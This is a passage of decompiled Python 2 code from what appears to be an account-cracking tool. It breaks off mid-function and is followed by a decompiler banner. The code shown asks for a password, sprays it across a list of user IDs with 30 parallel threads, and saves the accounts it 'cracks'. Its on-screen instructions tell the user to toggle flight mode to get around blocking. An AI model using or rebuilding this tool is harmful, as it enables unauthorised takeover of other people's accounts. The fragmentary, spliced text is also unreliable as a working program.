                pwx = raw_input(' \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Enter Manual Password: ')
                zks('\x1b[0;97m [\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Applying Passwords: \x1b[0;92m%s' % pwx)
                print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
                print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
                print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
                print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
                print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
                print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
                print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
                print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
                print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
                print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
                print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
                if pwx == '':
                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Password Can Not Be Empty')
                elif len(pwx) <= 5:
                    zks(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Password Must Be Six Digits or Characters Long')
                else:
                    def zkth(zsc=None):
                        global cp
                        global ok
                        with zthreads(max_workers=30) as (form):
                            for uid in self.id:
                                try:
                                    userid = uid.split('<=>')[0]
                                    form.submit(self.api, userid, zsc)
                                except:
                                    pass
                        os.remove(self.apk)
                        results(ok, cp)
                    zkth(pwx.split(','))
                    break
        elif zk in ('D', 'd', '1', '01'):
            os.system('clear')
            print logo
            print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
            print '\xe2\x94\x9c              \xe2\x94\x9c Cracking Started \xe2\x94\xa4\t         \xe2\x94\xa4'
            print '\xe2\x94\x9c              \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98              \xe2\x94\xa4'
            print '\xe2\x94\x9c         *** Important Instructions ***         \xe2\x94\xa4'
            print '\xe2\x94\x9c * Use Flight Mode(5 sec) If Stuck Or 0 Idz  *  \xe2\x94\xa4'
            print '\xe2\x94\x9c *To Stop The Cracking Process Press CTRL+Z  *  \xe2\x94\xa4'
            print '\xe2\x94\x9c *To Pause The Process Turn Off Internet/Wifi*  \xe2\x94\xa4'
            print '\xe2\x94\x9c *Cracked Idz Will Be Saved In Cracked Folder*  \xe2\x94\xa4'
            print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'
            print '\x1b[0;97m\xe2\x94\x8c' + 48 * '\xe2\x94\x80' + '\xe2\x94\x90'
            print '\xe2\x94\x9c  *** Wait! Cracked IDz Will Be Shown Here ***  \xe2\x94\xa4\n'
            self.passwords()
        else:
            print '  [!] Wrong Input! Try Again'
            time.sleep(2)
            crackmenu().passmenu()
        return
    def api(self, user, zkth):
        global loop
        (
#coding=utf-8
#========================================
# Decompile by Technical arham :)
# /usr/linux/desktop/decompiler
# Decompiled from: Python 2.7.18 (version)
#========================================
